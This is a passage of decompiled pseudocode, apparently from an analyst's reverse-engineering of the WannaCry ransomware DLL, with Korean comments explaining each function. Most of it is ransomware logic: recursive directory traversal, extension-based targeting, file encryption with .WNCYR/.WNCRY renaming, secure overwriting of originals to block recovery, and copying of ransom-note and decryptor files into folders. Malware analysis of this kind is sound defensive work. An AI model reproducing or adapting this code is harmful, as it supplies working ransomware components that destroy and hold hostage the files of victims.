                  v46 = FindFileData.nFileSizeLow;
                  InsertNodeAfterCopyData_10003760(&v32, &v36, v33, &v43);
                }
              }
            }
          }
        }
      }
      v7 = hFindFile;
    }
    while ( FindNextFileW(hFindFile, &FindFileData) );
    FindClose(v7);
    for ( i = *(wchar_t **)v33; i != v33; i = *(wchar_t **)i )
    {
      if ( !encryptFileByState_10002940(this, i + 4, 1) )
        InsertNodeAfterCopyData_10003760((_DWORD *)a3, &v36, *(_DWORD **)(a3 + 4), i + 4);
    }
    v13 = a4;
    if ( a4 == -1 )
    {
      v14 = Format;
      v13 = 0;
      if ( wcsnicmp(Format, L"\\\\", 2u) )
        v13 = 1;
      else
        v14 = Format + 2;
      v15 = *v14;
      for ( j = v14; v15; ++j )
      {
        if ( v15 == 92 )
          ++v13;
        v15 = j[1];
      }
    }
    if ( v13 <= 6 && v34 )
    {
      CopyReadMeFileToPath_10003200(Format);
      if ( v13 > 4 )
        CopyDecLnkFileToPath_10003240(Format);
      else
        CopyDecryptorFileToPath_10003280(Format);
    }
    v17 = v30;
    if ( a5 )
    {
      v18 = *(_DWORD **)v30;
      if ( *(void **)v30 != v30 )
      {
        v19 = v13 + 1;
        do
        {
          v20 = (wchar_t *)v18[3];
          if ( !v20 )
            v20 = (wchar_t *)`std::wstring::_Nullstr'::`2'::_C;
          encryptFilesInDirectory_10002300((_DWORD *)v35, v20, a3, v19, a5);// 재귀적으로 폴더 검사 
          v18 = (_DWORD *)*v18;
          v17 = v30;
        }
        while ( v18 != v30 );
      }
    }
    v21 = v17;
    LOBYTE(v49) = 0;
    v22 = (_DWORD *)*v17;
    if ( (_DWORD *)*v17 != v17 )
    {
      do
      {
        v23 = v22;
        v22 = (_DWORD *)*v22;
        RemoveNodeAndFree_10003620(&v29, (int)&v36, v23);
      }
      while ( v22 != v21 );
      v17 = v30;
    }
    operator delete(v17);
    v24 = (wchar_t *)v33;
    v30 = 0;
    v31 = 0;
    v25 = *(wchar_t **)v33;
    if ( *(void **)v33 != v33 )
    {
      do
      {
        v26 = v25;
        v25 = *(wchar_t **)v25;
        **((_DWORD **)v26 + 1) = *(_DWORD *)v26;
        *(_DWORD *)(*(_DWORD *)v26 + 4) = *((_DWORD *)v26 + 1);
        operator delete(v26);
        --v34;
      }
      while ( v25 != v24 );
    }
    operator delete(v33);
    result = 1;
  }
  return result;
}


// --- Metadata ---
// Function Name: encryptAndCleanupFiles_100027F0
// Address: 0x100027F0
// Signature: unknown_signature
// ---------------
int __thiscall encryptAndCleanupFiles_100027F0(_DWORD *this, wchar_t *Format, int a3)
{
  _DWORD *v4; // eax 암호화 후 로그 기록 및 일부 파일 삭제 수행 
  void **v5; // ecx
  unsigned int i; // ebx
  _DWORD *v7; // esi
  _DWORD *v8; // eax
  _DWORD **v9; // eax
  _DWORD *v10; // edi
  _DWORD *v11; // esi
  int v12; // eax
  _DWORD **v14; // [esp-4h] [ebp-28h]
  int v15; // [esp+Ch] [ebp-18h] BYREF
  void *v16; // [esp+10h] [ebp-14h]
  int v17; // [esp+14h] [ebp-10h]
  int v18; // [esp+20h] [ebp-4h]

  LOBYTE(v15) = a3;
  v4 = operator new(0x4ECu);
  *v4 = v4;
  v4[1] = v4;
  v16 = v4;
  v17 = 0;
  v18 = 0;
  encryptFilesInDirectory_10002300(this, Format, (int)&v15, -1, a3);
  v5 = (void **)v16;
  for ( i = 2; i <= 4; ++i )                    // 상태별 암호화 재시도 루프 
  {
    v7 = *v5;
    if ( *v5 != v5 )
    {
      do
      {
        v8 = (_DWORD *)this[308];
        if ( v8 && *v8 )
          break;
        if ( encryptFileByState_10002940(this, (wchar_t *)v7 + 4, i) )
        {
          v9 = (_DWORD **)v7;
          v7 = (_DWORD *)*v7;
          *v9[1] = *v9;
          (*v9)[1] = v9[1];
          operator delete(v9);
          --v17;
        }
        else
        {
          v7 = (_DWORD *)*v7;
        }
        v5 = (void **)v16;
      }
      while ( v7 != v16 );
    }
  }
  LogAndWipeFile_10002BA0((int)this, 0);        // 로그 기록 및 파일 삭제 
  v10 = v16;
  v18 = -1;
  v11 = *(_DWORD **)v16;
  if ( *(void **)v16 != v16 )
  {
    do
    {
      v12 = (int)v11;
      v11 = (_DWORD *)*v11;
      a3 = v12;
      v14 = (_DWORD **)*advancePtr_100035B0((_DWORD **)&a3, &Format, 0);// 남아있는 실패 리스트 정리 
      *v14[1] = *v14;
      (*v14)[1] = v14[1];
      operator delete(v14);
      --v17;
    }
    while ( v11 != v10 );
  }
  operator delete(v16);
  return 1;
}


// --- Metadata ---
// Function Name: encryptFileByState_10002940
// Address: 0x10002940
// Signature: unknown_signature
// ---------------
int __thiscall encryptFileByState_10002940(void *this, wchar_t *Destination, int a3)
{
  switch ( DetermineState_10002E70(Destination, a3) )
  {
    case 0:
      return 1;
    case 2:
      DeleteFileW_0(Destination);               // 대상 파일 삭제 
      return 1;
    case 3:
      if ( encryptFilesAndExt_10002200(this, Destination, 3) )// 암호화 시도 후 성공 시: 파일명 뒤에 .WNCYR 확장자 추가 
      {
        wcscat(Destination, L".WNCYR");
        wcscat(Destination + 360, L".WNCYR");
        *((_DWORD *)Destination + 312) = 5;
      }
      return 0;
    case 4:
      encryptFilesAndExt_10002200(this, Destination, 4);
      return 1;
    default:
      return 0;
  }
}


// --- Metadata ---
// Function Name: StartAddress
// Address: 0x100029E0
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  WannaCryFilePurger_100029F0((int)lpThreadParameter);
}


// --- Metadata ---
// Function Name: WannaCryFilePurger_100029F0
// Address: 0x100029F0
// Signature: unknown_signature
// ---------------
void __thiscall __noreturn WannaCryFilePurger_100029F0(int this)
{
  int i; // edi
  const WCHAR *v3; // edi
  DWORD v4; // eax
  DWORD v5; // eax
  _DWORD **v6; // edi
  _DWORD *v7; // ecx
  char v8; // al
  int v9; // eax
  int v10; // [esp-8h] [ebp-18h]

  while ( !*(_DWORD *)(this + 1244) )           // 암호화가 끝난 뒤 원본 파일 삭제/이동, 또는 실패한 파일 삭제 시도 
  {
    for ( i = 0; i < 60; ++i )
    {
      if ( *(_DWORD *)(this + 1244) )
        goto LABEL_23;
      Sleep(0x3E8u);
    }
    if ( *(_DWORD *)(this + 1244) )
      break;
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 1260));
    if ( *(_DWORD *)(this + 1256) )
    {
      do
      {
        v3 = `std::wstring::_Nullstr'::`2'::_C;
        if ( *(_DWORD *)(**(_DWORD **)(this + 1252) + 12) )
          v3 = *(const WCHAR **)(**(_DWORD **)(this + 1252) + 12);
        if ( !wcslen((const wchar_t *)(this + 1804)) )
          goto LABEL_26;
        if ( !MoveFileExW_0(v3, (LPCWSTR)(this + 1804), 1u) && GetFileAttributesW((LPCWSTR)(this + 1804)) != -1 )
        {
          v4 = GetFileAttributesW((LPCWSTR)(this + 1804));
          LOBYTE(v4) = v4 | 2;
          SetFileAttributesW((LPCWSTR)(this + 1804), v4);
          MoveFileExW_0((LPCWSTR)(this + 1804), 0, 4u);
        }
        v10 = *(_DWORD *)(this + 2324);
        *(_DWORD *)(this + 2324) = v10 + 1;
        swprintf(
          (wchar_t *const)(this + 1804),
          (const size_t)L"%s\\%d%s",
          (const wchar_t *const)(this + 1284),
          v10,
          L".WNCRYT");
        if ( !MoveFileExW_0(v3, (LPCWSTR)(this + 1804), 1u) )
        {
LABEL_26:
          if ( !DeleteFileW_0(v3) )
          {
            v5 = GetFileAttributesW(v3);
            LOBYTE(v5) = v5 | 2;
            SetFileAttributesW(v3, v5);
            MoveFileExW_0(v3, 0, 4u);
          }
        }
        v6 = **(_DWORD ****)(this + 1252);
        *v6[1] = *v6;
        (*v6)[1] = v6[1];
        v7 = v6[3];
        if ( v7 )
        {
          v8 = *((_BYTE *)v7 - 1);
          if ( !v8 || v8 == -1 )
            operator delete((char *)v7 - 2);
          else
            *((_BYTE *)v7 - 1) = v8 - 1;
        }
        v6[3] = 0;
        v6[4] = 0;
        v6[5] = 0;
        operator delete(v6);
        v9 = *(_DWORD *)(this + 1256) - 1;
        *(_DWORD *)(this + 1256) = v9;
      }
      while ( v9 );
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 1260));
  }
LABEL_23:
  ExitThread(0);
}


// --- Metadata ---
// Function Name: LogAndWipeFile_10002BA0
// Address: 0x10002BA0
// Signature: unknown_signature
// ---------------
void __thiscall LogAndWipeFile_10002BA0(int context, wchar_t *filePath)
{
  int v4; // edi
  _DWORD *prevNode; // edi
  _DWORD *nextNode; // ebp
  _DWORD *newNode; // eax
  _DWORD *v8; // ecx
  _DWORD *v9; // ecx
  char v10; // al
  const WCHAR *v11; // esi
  char v12[4]; // [esp+Ch] [ebp-1Ch] BYREF
  wchar_t *S1; // [esp+10h] [ebp-18h]
  int v14; // [esp+14h] [ebp-14h]
  int v15; // [esp+18h] [ebp-10h]
  int v16; // [esp+24h] [ebp-4h]
  struct _RTL_CRITICAL_SECTION *Stringa; // [esp+2Ch] [ebp+4h]

  if ( filePath )                               // filePath가 존재하거나 NULL인지에 따라 파일을 삭제하거나, 연결 리스트에 새 항목을 추가하고 기존 파일을 덮어쓰는 로직 
  {
    if ( !wcslen((const wchar_t *)(context + 1804)) )
      WipeFileWithRandomOrPattern_10003010(filePath, context + 4);
    Stringa = (struct _RTL_CRITICAL_SECTION *)(context + 1260);
    EnterCriticalSection((LPCRITICAL_SECTION)(context + 1260));
    v12[0] = context - 20;
    S1 = 0;
    v14 = 0;
    v15 = 0;
    v4 = wcslen(filePath);
    if ( (unsigned __int8)std::wstring::_Grow(v12, v4, 1) )
    {
      wmemcpy(S1, filePath, v4);
      v14 = v4;
      S1[v4] = 0;
    }
    prevNode = *(_DWORD **)(context + 1252);
    v16 = 0;
    nextNode = (_DWORD *)prevNode[1];
    newNode = operator new(0x18u);
    v8 = prevNode;
    if ( !prevNode )
      v8 = newNode;
    *newNode = v8;
    v9 = nextNode;
    if ( !nextNode )
      v9 = newNode;
    newNode[1] = v9;
    prevNode[1] = newNode;
    *(_DWORD *)newNode[1] = newNode;
    WStringAssign_10003810((int)(newNode + 2), v12);
    ++*(_DWORD *)(context + 1256);
    if ( S1 )
    {
      v10 = *((_BYTE *)S1 - 1);
      if ( v10 && v10 != -1 )
      {
        *((_BYTE *)S1 - 1) = v10 - 1;
        LeaveCriticalSection(Stringa);
        return;
      }
      operator delete(S1 - 1);
    }
    LeaveCriticalSection(Stringa);
  }
  else
  {
    v11 = (const WCHAR *)(context + 1804);
    if ( wcslen((const wchar_t *)(context + 1804)) )
      DeleteFileW_0(v11);
  }
}


// --- Metadata ---
// Function Name: _wmemcpy
// Address: 0x10002D30
// Signature: unknown_signature
// ---------------
wchar_t *__cdecl wmemcpy(wchar_t *S1, const wchar_t *S2, size_t N)
{
  wchar_t *result; // eax
  size_t v4; // esi
  wchar_t *i; // ecx
  wchar_t v7; // di

  result = S1;
  v4 = N;
  for ( i = S1; v4; --v4 )
  {
    v7 = *S2++;
    *i++ = v7;
  }
  return result;
}


// --- Metadata ---
// Function Name: GetFileExtensionType_10002D60
// Address: 0x10002D60
// Signature: unknown_signature
// ---------------
int __stdcall GetFileExtensionType_10002D60(wchar_t *filePath)
{
  int result; // eax
  const wchar_t *extStr; // edi
  wchar_t **v3; // esi
  wchar_t *v4; // eax
  wchar_t **v5; // esi
  wchar_t *v6; // eax
  int v7; // eax

  result = (int)wcsrchr(filePath, 0x2Eu);       // 파일 확장자를 검사하여 특정 확장자 유형을 분류 
  extStr = (const wchar_t *)result;             // exe, dll, WNCRY, WNCRYT, WNCYR  
  if ( result )
  {
    if ( wcsicmp((const wchar_t *)result, L".exe") && wcsicmp(extStr, L".dll") )
    {
      if ( wcsicmp(extStr, L".WNCRY") )
      {
        v3 = off_1000C098;
        if ( off_1000C098[0] )
        {
          while ( wcsicmp(*v3, extStr) )
          {
            v4 = v3[1];
            ++v3;
            if ( !v4 )
              goto LABEL_9;
          }
          result = 2;
        }
        else
        {
LABEL_9:
          v5 = off_1000C0FC;
          if ( off_1000C0FC[0] )
          {
            while ( wcsicmp(*v5, extStr) )
            {
              v6 = v5[1];
              ++v5;
              if ( !v6 )
                goto LABEL_15;
            }
            result = 3;
          }
          else
          {
LABEL_15:
            if ( wcsicmp(extStr, L".WNCRYT") )
            {
              v7 = -(wcsicmp(extStr, L".WNCYR") != 0);
              LOBYTE(v7) = v7 & 0xFB;
              result = v7 + 5;
            }
            else
            {
              result = 4;
            }
          }
        }
      }
      else
      {
        result = 6;
      }
    }
    else
    {
      result = 1;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: DetermineState_10002E70
// Address: 0x10002E70
// Signature: unknown_signature
// ---------------
int __stdcall DetermineState_10002E70(_DWORD *context, unsigned int action)
{
  int statusFlag; // esi
  int v4; // ecx
  int v5; // eax
  int v6; // edi
  bool v7; // zf
  int v8; // eax

  if ( action >= 4 )                            // switch문 상태값 반환 
    return 4;
  statusFlag = context[312];
  if ( !statusFlag )
    return 1;
  if ( action == 3 )
    return 4;
  if ( statusFlag == 5 )
    return 1;
  if ( statusFlag == 4 )
    return 2;
  v4 = context[311];
  v5 = 0;
  v6 = 0;
  v7 = v4 == 0;
  if ( !v4 )
  {
    if ( context[310] <= 0x400u )
      v5 = 1;
    v7 = 1;
  }
  if ( !v7 || context[310] >= 0xC800000u )
    v6 = 1;
  if ( action == 1 )
  {
    if ( statusFlag == 2 )
    {
      if ( v6 )
        return 3;
LABEL_30:
      v8 = -(v5 != 0);
      LOBYTE(v8) = v8 & 0xFD;
      return v8 + 4;
    }
    if ( statusFlag == 3 )
      return 1;
  }
  else if ( action == 2 )
  {
    if ( statusFlag == 2 )
      return 1;
    if ( statusFlag == 3 )
    {
      if ( v6 )
        return 3;
      goto LABEL_30;
    }
  }
  return 0;
}


// --- Metadata ---
// Function Name: TestDirectoryWritable_10002F70
// Address: 0x10002F70
// Signature: unknown_signature
// ---------------
BOOL __cdecl TestDirectoryWritable_10002F70(LPCWSTR directoryPath)
{
  HANDLE hTempFile; // eax
  BOOL result; // eax
  WCHAR TempFileName; // [esp+20h] [ebp-2D0h] BYREF
  char v4[716]; // [esp+22h] [ebp-2CEh] BYREF
  __int16 v5; // [esp+2EEh] [ebp-2h]

  TempFileName = 0;
  memset(v4, 0, sizeof(v4));
  v5 = 0;
  GetTempFileNameW(directoryPath, L"~SD", 0, &TempFileName);// 디렉토리 쓰기 권한이 있는지 확인 
  hTempFile = CreateFileW_0(&TempFileName, 0x40000000u, 0, 0, 2u, 2u, 0);
  result = 0;
  if ( hTempFile != (HANDLE)-1 )
  {
    dword_1000D934(hTempFile);
    if ( DeleteFileW_0(&TempFileName) )
      result = 1;
  }
  return result;
}


// --- Metadata ---
// Function Name: return0_10003000
// Address: 0x10003000
// Signature: unknown_signature
// ---------------
int return0_10003000()
{
  return 0;
}


// --- Metadata ---
// Function Name: WipeFileWithRandomOrPattern_10003010
// Address: 0x10003010
// Signature: unknown_signature
// ---------------
int __cdecl WipeFileWithRandomOrPattern_10003010(LPCWSTR filePath, int hCryptProv)
{
  DWORD v2; // eax
  int result; // eax
  HANDLE v4; // ebp
  LONG v5; // edx
  DWORD v6; // eax
  DWORD v7; // ebx
  unsigned int v8; // ecx
  LONG v9; // eax
  DWORD v10; // edx
  unsigned int v11; // esi
  LONG v12; // edi
  DWORD v13; // ebx
  DWORD v14; // kr08_4
  LARGE_INTEGER FileSize; // [esp+44h] [ebp-40014h] BYREF
  unsigned int v16; // [esp+4Ch] [ebp-4000Ch] BYREF
  LONG v17; // [esp+54h] [ebp-40004h]
  BYTE pbBuffer[4]; // [esp+58h] [ebp-40000h] BYREF

  v2 = GetFileAttributesW(filePath);            // 디스크에서 복구하기 어렵게 만드는 전형적인 파일 완전 삭제 방식 
  if ( v2 == -1 )
    return 0;
  if ( (v2 & 1) != 0 )                          // 파일의 일부 또는 전체를 난수 혹은 고정 패턴(0x55) 으로 덮어씀 
  {
    LOBYTE(v2) = v2 & 0xFE;
    SetFileAttributesW(filePath, v2);
  }
  v4 = CreateFileW_0(filePath, 0x40000000u, 3u, 0, 3u, 0, 0);
  if ( v4 != (HANDLE)-1 )
    goto LABEL_9;
  result = return0_10003000();
  if ( !result )
    return result;
  v4 = CreateFileW_0(filePath, 0x40000000u, 3u, 0, 3u, 0, 0);
  if ( v4 == (HANDLE)-1 )
    return 0;
LABEL_9:
  GetFileSizeEx(v4, &FileSize);
  v5 = FileSize.HighPart;
  if ( hCryptProv )                             // hCryptProv 인자가 있으면 암호학적 난수로, 없으면 고정값으로 데이터를 채움 
  {
    v6 = FileSize.LowPart;
    if ( FileSize.QuadPart >= 0x40000 )
    {
      v6 = 0x40000;
      v17 = 0;
    }
    else
    {
      v17 = FileSize.HighPart;
    }
    CryptGenRandomWrapper_10004420((HCRYPTPROV *)hCryptProv, pbBuffer, v6);
    v5 = FileSize.HighPart;
    v7 = FileSize.LowPart;
  }
  else                                          // 1차적으로 마지막 1KB 또는 전체 크기만큼 덮어쓰고, 이후 전체 파일을 반복적으로 덮어씀 
  {
    v7 = FileSize.LowPart;
    if ( FileSize.QuadPart >= 0x40000 )
    {
      v8 = 0x40000;
      v17 = 0;
    }
    else
    {
      v17 = FileSize.HighPart;
      v8 = FileSize.LowPart;
    }
    memset(pbBuffer, 0x55u, v8);
  }
  if ( v5 < 0 || v5 <= 0 && v7 < 0x400 )
  {
    WriteFile_0(v4, pbBuffer, v7, &v16, 0);
  }
  else
  {
    SetFilePointer(v4, -1024, 0, 2u);
    WriteFile_0(v4, pbBuffer, 0x400u, &v16, 0);
  }
  FlushFileBuffers(v4);
  SetFilePointer(v4, 0, 0, 0);
  v9 = FileSize.HighPart;
  v10 = FileSize.LowPart;
  v11 = 0;
  v12 = 0;
  if ( FileSize.QuadPart > 0 )
  {
    do
    {
      while ( 1 )
      {
        v13 = 0x40000;
        if ( (__int64)(__PAIR64__(v9, v10) - __PAIR64__(v12, v11)) < 0x40000 )
          v13 = v10 - v11;
        WriteFile_0(v4, pbBuffer, v13, &v16, 0);
        v9 = FileSize.HighPart;
        v14 = v16 + v11;
        v12 = (v16 + __PAIR64__(v12, v11)) >> 32;
        v11 += v16;
        if ( v12 >= FileSize.HighPart )
          break;
        v10 = FileSize.LowPart;
      }
      if ( v12 > FileSize.HighPart )
        break;
      v10 = FileSize.LowPart;
    }
    while ( v14 < FileSize.LowPart );
  }
  dword_1000D934(v4);
  return 1;
}


// --- Metadata ---
// Function Name: CopyReadMeFileToPath_10003200
// Address: 0x10003200
// Signature: unknown_signature
// ---------------
BOOL __stdcall CopyReadMeFileToPath_10003200(wchar_t *targetDir)
{
  wchar_t Buffer[360]; // [esp+0h] [ebp-2D0h] BYREF

  swprintf(Buffer, (const size_t)L"%s\\%s", targetDir, L"@Please_Read_Me@.txt");// 경로와 파일명 합치기 
  return CopyFileW(L"@Please_Read_Me@.txt", Buffer, 1);// 파일 복사 
}


// --- Metadata ---
// Function Name: CopyDecLnkFileToPath_10003240
// Address: 0x10003240
// Signature: unknown_signature
// ---------------
BOOL __stdcall CopyDecLnkFileToPath_10003240(wchar_t *Format)
{
  wchar_t Buffer[360]; // [esp+0h] [ebp-2D0h] BYREF

  swprintf(Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.exe.lnk");
  return CopyFileW(L"@WanaDecryptor@.exe.lnk", Buffer, 1);
}


// --- Metadata ---
// Function Name: CopyDecryptorFileToPath_10003280
// Address: 0x10003280
// Signature: unknown_signature
// ---------------
BOOL __stdcall CopyDecryptorFileToPath_10003280(wchar_t *Format)
{
  wchar_t Buffer[360]; // [esp+0h] [ebp-2D0h] BYREF

  swprintf(Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.exe");
  return CopyFileW(L"@WanaDecryptor@.exe", Buffer, 1);
}


// --- Metadata ---
// Function Name: IsCriticalSystemFolder_100032C0
// Address: 0x100032C0
// Signature: unknown_signature
// ---------------
BOOL __stdcall IsCriticalSystemFolder_100032C0(wchar_t *path, wchar_t *folderName)
{
  wchar_t *posAfterPrefix; // eax
  const wchar_t *subPath; // esi

  if ( wcsnicmp(path, L"\\\\", 2u) )            // 시스템을 망가뜨리지 않도록 시스템 주요 폴더를 체크 
    posAfterPrefix = path + 1;
  else
    posAfterPrefix = wcsstr(path, L"$\\");
  if ( !posAfterPrefix )
    goto LABEL_26;
  subPath = posAfterPrefix + 1;
  if ( !wcsicmp(posAfterPrefix + 1, L"\\Intel") )
    return 1;
  if ( !wcsicmp(subPath, L"\\ProgramData") )
    return 1;
  if ( !wcsicmp(subPath, L"\\WINDOWS") )
    return 1;
  if ( !wcsicmp(subPath, L"\\Program Files") )
    return 1;
  if ( !wcsicmp(subPath, L"\\Program Files (x86)") )
    return 1;
  if ( wcsstr(subPath, L"\\AppData\\Local\\Temp") )
    return 1;
  if ( wcsstr(subPath, L"\\Local Settings\\Temp") )
    return 1;
LABEL_26:
  if ( !wcsicmp(folderName, L" This folder protects against ransomware. Modifying it will reduce protection") )
    return 1;
  if ( wcsicmp(folderName, L"Temporary Internet Files") )
    return wcsicmp(folderName, L"Content.IE5") == 0;
  return 1;
}


// --- Metadata ---
// Function Name: LoadFileIOAPI_10003410
// Address: 0x10003410
// Signature: unknown_signature
// ---------------
int LoadFileIOAPI_10003410()
{
  int result; // eax
  HMODULE v1; // eax
  HMODULE v2; // esi
  BOOL (__stdcall *CloseHandle)(HANDLE); // eax

  if ( !LoadCryptographicAPI_10004440() )       // 런타임 시 환경에서 필요한 API가 존재하는지를 확인
    goto LABEL_13;
  if ( CreateFileW_0 )
    return 1;
  v1 = LoadLibraryA("kernel32.dll");            // Windows 파일 I/O API를 런타임에서 동적으로 로드 
  v2 = v1;
  if ( !v1 )
    goto LABEL_13;                              // 백신 우회나 이식성을 고려한 악성코드 
  CreateFileW_0 = (HANDLE (__stdcall *)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))GetProcAddress(v1, "CreateFileW");
  WriteFile_0 = (BOOL (__stdcall *)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))GetProcAddress(v2, "WriteFile");
  ReadFile_0 = (BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))GetProcAddress(v2, "ReadFile");
  MoveFileW = (BOOL (__stdcall *)(LPCWSTR, LPCWSTR))GetProcAddress(v2, "MoveFileW");
  MoveFileExW_0 = (BOOL (__stdcall *)(LPCWSTR, LPCWSTR, DWORD))GetProcAddress(v2, "MoveFileExW");
  DeleteFileW_0 = (BOOL (__stdcall *)(LPCWSTR))GetProcAddress(v2, "DeleteFileW");
  CloseHandle = (BOOL (__stdcall *)(HANDLE))GetProcAddress(v2, "CloseHandle");
  dword_1000D934 = (int (__stdcall *)(_DWORD))CloseHandle;
  if ( !CreateFileW_0 )
    goto LABEL_13;
  if ( WriteFile_0 && ReadFile_0 && MoveFileW && MoveFileExW_0 && DeleteFileW_0 && CloseHandle )
    result = 1;
  else
LABEL_13:
    result = 0;
  return result;
}


// --- Metadata ---
// Function Name: sub_10003560
// Address: 0x10003560
// Signature: unknown_signature
// ---------------
int __thiscall sub_10003560(int this)
{
  _DWORD **v2; // ebx
  _DWORD *i; // esi
  _DWORD **v4; // eax
  int result; // eax

  v2 = *(_DWORD ***)(this + 4);
  for ( i = *v2; i != v2; --*(_DWORD *)(this + 8) )
  {
    v4 = (_DWORD **)i;
    i = (_DWORD *)*i;
    *v4[1] = *v4;
    (*v4)[1] = v4[1];
    operator delete(v4);
  }
  operator delete(*(void **)(this + 4));
  result = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  return result;
}


// --- Metadata ---
// Function Name: advancePtr_100035B0
// Address: 0x100035B0
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall advancePtr_100035B0(_DWORD **this, _DWORD *a2, int a3)
{
  _DWORD *v3; // edx
  _DWORD *result; // eax

  v3 = *this;
  *this = (_DWORD *)**this;                     // 연결리스트에서 다음 노드로 이동 후 이전 노드 저장 
  result = a2;
  *a2 = v3;
  return result;
}


// --- Metadata ---
// Function Name: InsertNewWStringNode_100035C0
// Address: 0x100035C0
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall InsertNewWStringNode_100035C0(_DWORD *this, _DWORD *NewNodePtr, _DWORD *currentNode, int newStringSource)
{
  _DWORD *nextNode; // ebp
  _DWORD *newNode; // esi
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *result; // eax

  nextNode = (_DWORD *)currentNode[1];          // 이중 연결 리스트에 wstring을 담은 새 노드를 생성 및 삽입 
  newNode = operator new(0x18u);
  v7 = currentNode;
  if ( !currentNode )
    v7 = newNode;
  *newNode = v7;
  v8 = nextNode;
  if ( !nextNode )
    v8 = newNode;
  newNode[1] = v8;
  currentNode[1] = newNode;
  *(_DWORD *)newNode[1] = newNode;
  WStringAssign_10003810((int)(newNode + 2), (char *)newStringSource);
  ++this[2];
  result = NewNodePtr;
  *NewNodePtr = newNode;
  return result;
}


// --- Metadata ---
// Function Name: RemoveNodeAndFree_10003620
// Address: 0x10003620
// Signature: unknown_signature
// ---------------
int __thiscall RemoveNodeAndFree_10003620(_DWORD *this, int a2, void *deleteNodePtr)
{
  int v4; // ebp
  int v5; // eax
  char v6; // cl
  int result; // eax

  v4 = *(_DWORD *)deleteNodePtr;                // 연결리스트 노드 삭제 
  **((_DWORD **)deleteNodePtr + 1) = *(_DWORD *)deleteNodePtr;
  *(_DWORD *)(*(_DWORD *)deleteNodePtr + 4) = *((_DWORD *)deleteNodePtr + 1);
  v5 = *((_DWORD *)deleteNodePtr + 3);
  if ( v5 )
  {
    v6 = *(_BYTE *)(v5 - 1);
    if ( !v6 || v6 == -1 )
      operator delete((void *)(v5 - 2));
    else
      *(_BYTE *)(v5 - 1) = v6 - 1;
  }
  *((_DWORD *)deleteNodePtr + 3) = 0;
  *((_DWORD *)deleteNodePtr + 4) = 0;
  *((_DWORD *)deleteNodePtr + 5) = 0;
  operator delete(deleteNodePtr);
  --this[2];
  result = a2;
  *(_DWORD *)a2 = v4;
  return result;
}


// --- Metadata ---
// Function Name: DeleteNodeRangeDeep_100036A0
// Address: 0x100036A0
// Signature: unknown_signature
// ---------------
int __thiscall DeleteNodeRangeDeep_100036A0(_DWORD *this, int lastNodePtr, void *startNode, int endNode)
{
  _DWORD *curNode; // edi
  _DWORD **nodeToDelete; // esi
  _DWORD *attachedData; // ecx
  char refCount; // al
  int result; // eax

  curNode = startNode;
  if ( startNode == (void *)endNode )           // 범위 내 노드 삭제 
  {
    result = lastNodePtr;
    *(_DWORD *)lastNodePtr = startNode;
  }
  else
  {
    do
    {
      nodeToDelete = (_DWORD **)curNode;
      curNode = (_DWORD *)*curNode;
      *nodeToDelete[1] = *nodeToDelete;
      (*nodeToDelete)[1] = nodeToDelete[1];
      attachedData = nodeToDelete[3];
      if ( attachedData )
      {
        refCount = *((_BYTE *)attachedData - 1);
        if ( !refCount || refCount == -1 )
          operator delete((char *)attachedData - 2);
        else
          *((_BYTE *)attachedData - 1) = refCount - 1;
      }
      nodeToDelete[3] = 0;
      nodeToDelete[4] = 0;
      nodeToDelete[5] = 0;
      operator delete(nodeToDelete);
      --this[2];
    }
    while ( curNode != (_DWORD *)endNode );
    result = lastNodePtr;
    *(_DWORD *)lastNodePtr = curNode;
  }
  return result;
}


// --- Metadata ---
// Function Name: CreateLinkedNode_10003730
// Address: 0x10003730
// Signature: unknown_signature
// ---------------
_DWORD *__stdcall CreateLinkedNode_10003730(_DWORD *prevNode, int a2)
{
  _DWORD *newNode; // eax
  _DWORD *linkedPrev; // ecx

  newNode = operator new(0x18u);                // 연결리스트 노드 생성 
  linkedPrev = prevNode;
  if ( !prevNode )
    linkedPrev = newNode;
  *newNode = linkedPrev;
  if ( a2 )
    newNode[1] = a2;
  else
    newNode[1] = newNode;
  return newNode;
}


// --- Metadata ---
// Function Name: InsertNodeAfterCopyData_10003760
// Address: 0x10003760
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall InsertNodeAfterCopyData_10003760(_DWORD *this, _DWORD *outNewNode, _DWORD *currentNode, const void *dataToCopy)
{
  _DWORD *nextNode; // edi
  _DWORD *newNode; // eax
  _DWORD *v7; // ecx
  _DWORD *v8; // ecx

  nextNode = (_DWORD *)currentNode[1];          // 새 노드를 삽입하고, 새 노드에 데이터를 복사 
  newNode = operator new(0x4ECu);
  v7 = currentNode;
  if ( !currentNode )
    v7 = newNode;
  *newNode = v7;
  v8 = nextNode;
  if ( !nextNode )
    v8 = newNode;
  newNode[1] = v8;
  currentNode[1] = newNode;
  *(_DWORD *)newNode[1] = newNode;
  if ( newNode != (_DWORD *)-8 )
    qmemcpy(newNode + 2, dataToCopy, 0x4E4u);
  ++this[2];
  *outNewNode = newNode;
  return outNewNode;
}


// --- Metadata ---
// Function Name: DeleteNodeRangeShallow_100037C0
// Address: 0x100037C0
// Signature: unknown_signature
// ---------------
int __thiscall DeleteNodeRangeShallow_100037C0(_DWORD *this, int lastNodePtr, void *startNode, int endNode)
{
  _DWORD *curNode; // esi
  _DWORD **nodeToDelete; // eax
  int result; // eax

  curNode = startNode;
  if ( startNode != (void *)endNode )           // 범위 내 노드 제거(얕은)
  {
    do
    {
      nodeToDelete = (_DWORD **)curNode;
      curNode = (_DWORD *)*curNode;
      *nodeToDelete[1] = *nodeToDelete;
      (*nodeToDelete)[1] = nodeToDelete[1];
      operator delete(nodeToDelete);
      --this[2];
    }
    while ( curNode != (_DWORD *)endNode );
  }
  result = lastNodePtr;
  *(_DWORD *)lastNodePtr = curNode;
  return result;
}


// --- Metadata ---
